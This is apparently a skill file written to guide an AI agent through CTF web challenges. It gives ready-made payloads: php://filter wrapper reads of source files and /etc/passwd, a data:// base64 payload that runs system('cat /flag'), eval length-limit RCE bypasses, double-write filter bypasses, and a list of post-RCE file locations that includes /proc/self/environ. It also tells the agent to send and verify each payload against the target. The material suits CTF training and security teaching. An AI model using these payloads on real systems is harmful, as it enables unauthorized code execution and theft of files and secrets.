---
name: ctf-web
description: CTF Web attack knowledge base — PHP loose-comparison bypass, command-injection space bypass, eval echo techniques, SSTI injection chains, deserialization exploit chains, PHP code-audit checklist, common flag locations
routing:
  target_types: [ctf, web]
  task_types: [ctf]
  technologies: [php]
  vulnerability_classes: [rce, ssti, deserialization, type_juggling, path_traversal]
---

# CTF Web Attack Knowledge Base

A practical knowledge base for CTF Web challenges, providing **concrete bypass values, payload templates, and a code-audit checklist** rather than pentest methodology.

**Difference from `web-security-advanced`**:
- `web-security-advanced` → pentest methodology (how to systematically test a web app)
- `ctf-web` → CTF practical knowledge base (which value to use for a PHP loose comparison, how to bypass spaces, how to echo eval output)

## Core principles

1. **Precise values over methodology** — provide ready-to-use bypass values and payloads, not "you could try" suggestions
2. **Verify with tools** — every payload must actually be sent and verified with `fetch` or `python_execute`; do not guess the result
3. **Path selection** — when multiple exploit paths exist, prefer the least-filtered and simplest one
4. **Record failures** — record a payload immediately after it fails; do not retry it

## First-pass workflow (standard flow for a CTF Web challenge)

1. Access the target URL; review the page source, HTTP headers, and cookies
2. **If the source contains `highlight_file` → use python_execute + strip_tags to extract clean source** (fetch output may misread it)
3. Check robots.txt, .git/, .svn/, and backup files (index.php.bak, www.zip, etc.)
4. Directory scan (common: /flag, /admin, /login, /upload, /api)
5. If source is available → enter code-audit mode (see `php-code-audit-checklist.md`)
6. If no source → actively probe injection points, upload points, and file inclusion

## Scenario routing

| Scenario | Reference | Core content |
|------|---------|---------|
| ⭐ PHP wrapper file read (try first when you meet file inclusion / a filename parameter) | see "PHP wrapper quick-reference" below | `php://filter` to read source/flag directly |
| Source-code extraction | `source-code-extraction.md` | strip_tags extraction, php://filter, .phps, backup files, integrity checks |
| PHP loose comparison / type juggling | `php-bypass-cheatsheet.md` | Complete list of 0e-prefixed MD5 values, array bypass, extract() overwrite |
| ⭐ MD5 loose-comparison collision (`md5(a)==md5(b)` loose comparison) | `php-bypass-cheatsheet.md` | ⚠️ after 0e it must be all digits! Use verified values like `QNKCDZO`+`240610708` |
| ⭐ preg_replace/str_replace double-write bypass | see "Double-write bypass quick-reference" below | `NSSNSSCTFCTF` → after replacement = `NSSCTF` |
| Command-injection space bypass | `command-injection-bypass.md` | Full table of ${IFS}/$IFS$9/</%09/%0a |
| eval/RCE techniques | `eval-and-rce-techniques.md` | system/exec/passthru differences, highlight_file output order, no-echo exfiltration |
| SSTI injection chains | `ssti-injection-chains.md` | Quick-reference of Jinja2/Twig/ERB/Mako injection chains |
| Deserialization exploit chains | `deserialization-playbook.md` | PHP/Java/Python deserialization, SoapClient CRLF |
| File upload → RCE | `web-security-advanced` → `web-playbook-08-file-vulnerabilities.md` | .htaccess bypass, log poisoning, polyglot webshells |
| CTF quick reference | `web-ctf-quick-reference.md` | Flag locations, common chain shapes, response-header hints |
| PHP code audit | `php-code-audit-checklist.md` | Input entry → filtering → dangerous functions → output analysis |

## ⭐ PHP wrapper quick-reference (try first on file inclusion / filename parameters)

**Trigger conditions**: when the challenge shows any of the following traits, **try php://filter before anything else**:

| Trigger trait | Example |
|---------|------|
| A parameter accepts a filename/path | `?file=xxx` / `?page=xxx` / `?num=xxx` / `?path=xxx` |
| `include` / `require` / `include_once` | these functions appear in the source |
| The page displays source | `highlight_file()` / `show_source()` |
| The challenge asks you to "read a file" or "find the flag" | it clearly requires reading a server file |

### Wrapper payload quick-reference

```
# 1. Read PHP source (base64-encoded to avoid PHP execution)
?file=php://filter/read=convert.base64-encode/resource=flag.php
?file=php://filter/read=convert.base64-encode/resource=index.php

# 2. Read PHP source (rot13-encoded)
?file=php://filter/read=string.rot13/resource=flag.php

# 3. Read a file directly (non-PHP files such as .txt/.log)
?file=php://filter/resource=/etc/passwd

# 4. Code execution
?file=php://input  (put PHP code in the POST body)
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

### ⚠️ Key reminders

1. **Do not think only about "bypassing" — first ask whether you can "read directly"** — many challenges' parameters accept a filename, so you can read flag.php directly with a wrapper and never need to bypass any filter
2. **`convert.base64-encode` is a universal reader** — an included PHP file executes, but once base64-encoded it does not, so you get the source
3. **The parameter is not always named `file`** — it may be `page`, `num`, `path`, `template`, etc.; as long as the value is treated as a file path/name, it may work
4. **Decode the base64 with the `crypto_decode` tool** — do not guess the decoded result in your head

## Common flag-location quick-reference

**⚠️ After landing RCE, you must test flag locations in the following priority order; do not stop at flag.php in the current directory:**

```
Priority 1 (most common): cat /flag
Priority 2:               cat /flag.txt
Priority 3:               ls /  → find the flag filename in the root directory
Priority 4:               cat /var/www/html/flag.php
Priority 5:               cat /home/ctf/flag
Priority 6:               cat /root/flag
Other locations:          /environment, /proc/self/environ, the env command
```

**Note**: `ls` lists the current directory by default (`/var/www/html/`); the root `/flag` requires `ls /` to be seen.

## Quick triage of common CTF Web challenge types

| Challenge trait | Likely topic | Recommended reference |
|---------|---------|---------|
| A parameter accepts a filename/path | ⭐ **try php://filter to read the flag first** | see "PHP wrapper quick-reference" above |
| Page has only a login box | SQL injection / weak password / race condition | php-bypass-cheatsheet.md |
| Page displays code | Code audit | php-code-audit-checklist.md |
| eval/system keywords | RCE + space/keyword bypass | eval-and-rce-techniques.md + command-injection-bypass.md |
| eval + length limit | RCE + `$_GET` chained-parameter length bypass | see "RCE + length-limit bypass" below |
| File-upload feature | Extension bypass / MIME bypass | `web-security-advanced` → `web-playbook-08-file-vulnerabilities.md` |
| Page template rendering | SSTI | ssti-injection-chains.md |
| Serialization/deserialization | PHP/Java deserialization | deserialization-playbook.md |
| A WAF/filter hint | Regex bypass / encoding bypass | php-bypass-cheatsheet.md + command-injection-bypass.md |

## RCE + length-limit bypass (recommended strategy)

When `eval()` has a `strlen()` length limit (e.g. ≤ 18 chars), **prefer `$_GET` chained parameters**:

### Standard solution

```
?get=eval($_GET['A']);&A=system('cat /flag');
```

**How it works**:
- `eval($_GET['A'])` = 16 chars, passing the length limit
- The real command is in the second GET parameter `A`, which has no length limit
- PHP first runs `eval()`, executing the value of `$_GET['A']` as PHP code

### Variants

| Length limit | Payload | Char count |
|---------|---------|--------|
| ≤ 18 | `eval($_GET['A']);` | 16 |
| ≤ 18 | `eval($_GET[0]);` | 14 |
| ≤ 16 | `eval($_GET[A]);` | 13 (no quotes; PHP auto-casts to string) |
| ≤ 12 | `$_GET[0]();` | 10 (pass a function name like `system` in A, the command in another parameter) |

### Notes
- Do not spend time shortening the payload (e.g. `?>` to exit PHP mode, backticks, etc.) — **chained parameters are the universal solution**
- Dual-GET-parameter URL format: `?get=eval($_GET['A']);&A=system('cat /flag');`
- Build the request with the `python_execute` tool rather than fetch (fetch may not support multiple parameters)

## ⭐ preg_replace / str_replace double-write bypass quick-reference

**Trigger conditions**: the source contains `preg_replace('/X/', '', $str)` or `str_replace('X', '', $str)`, and after replacement `$str === "X"` is required

### Core principle
Embed the full keyword inside the keyword; after the inner one is deleted, the outer halves join to form the original word.

### General construction formula
```
input = first-half-of-keyword + keyword + second-half-of-keyword
```

### Common filtered-word quick-reference table

| Filtered keyword | Double-write input | Replacement process | Result |
|-----------|---------|---------|------|
| NSSCTF | `NSSNSSCTFCTF` | delete the middle NSSCTF → NSS+CTF | `NSSCTF` ✅ |
| flag | `flflagag` | delete the middle flag → fl+ag | `flag` ✅ |
| cat | `cacatt` | delete the middle cat → ca+t | `cat` ✅ |
| system | `syssystemtem` | delete the middle system → sys+tem | `system` ✅ |
| hack | `hahackck` | delete the middle hack → ha+ck | `hack` ✅ |
| cmd | `cmcmdd` | delete the middle cmd → cm+d | `cmd` ✅ |
| exec | `exexecec` | delete the middle exec → ex+ec | `exec` ✅ |

### ⚠️ Key notes
1. **Case variation does not work** — after replacement it returns `NssCTF`, not `"NSSCTF"`, so strict comparison fails
2. **Recognition signal** — seeing `preg_replace('/X/', '', $str)` + `$str === "X"` → use double-write immediately
3. **str_replace is the same** — `str_replace` also replaces once, so double-write works equally
4. **Multiple replacements** — if the code calls `preg_replace` multiple times, you may need triple/quadruple-write, but in CTFs double-write usually suffices
